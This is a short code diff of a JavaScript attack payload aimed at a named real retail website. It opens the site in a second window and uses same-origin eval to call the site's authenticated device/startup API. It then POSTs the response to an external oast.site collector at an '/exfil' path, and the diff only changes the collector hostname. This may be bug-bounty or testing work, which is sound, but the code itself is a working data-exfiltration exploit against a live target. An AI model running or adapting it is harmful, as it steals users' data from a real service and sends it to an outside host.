@@ -9,12 +9,9 @@
 //     `);
 // }, 2000);
 
-// This runs in the iframe context
 var victimWindow = open('https://eur.halara.com/pages/shipping-customs?sa-visual-mode=true', 'victim-tab');
 
-// Wait for navigation to complete
 setTimeout(() => {
-    // Now we have cross-window access on same origin
     victimWindow.eval(`
         fetch('https://api-proxy.eur.halara.com/mall-rest/api/v1/device/startup', {
             method: 'GET',
@@ -25,7 +22,7 @@ setTimeout(() => {
         })
         .then(r => r.text())
         .then(data => {
-            fetch('https://xiue7lk6ilnj16v3uezz4zzce0324mtbr.oast.site/exfil', {
+            fetch('https://l8pjj46vil2a13abk2x66ed4x5fwywyy6.oast.site/exfil', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -37,7 +34,7 @@ setTimeout(() => {
             });
         })
         .catch(e => {
-            fetch('https://xiue7lk6ilnj16v3uezz4zzce0324mtbr.oast.site/error?msg=' + encodeURIComponent(e.toString()));
+            fetch('https://l8pjj46vil2a13abk2x66ed4x5fwywyy6.oast.site/error?msg=' + encodeURIComponent(e.toString()));
         });
     `);
 }, 2000);
